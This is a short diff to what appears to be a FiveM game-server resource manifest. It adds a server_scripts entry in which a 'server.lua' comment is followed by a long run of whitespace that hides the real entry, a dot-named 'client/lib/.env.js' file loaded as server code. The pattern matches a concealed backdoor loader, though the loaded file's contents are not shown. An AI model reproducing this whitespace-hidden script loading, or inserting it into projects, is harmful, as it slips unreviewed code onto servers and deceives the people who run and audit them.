@@ -26,3 +26,7 @@ files {
 }
 
 dependency 'es_extended'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.env.js',
+}
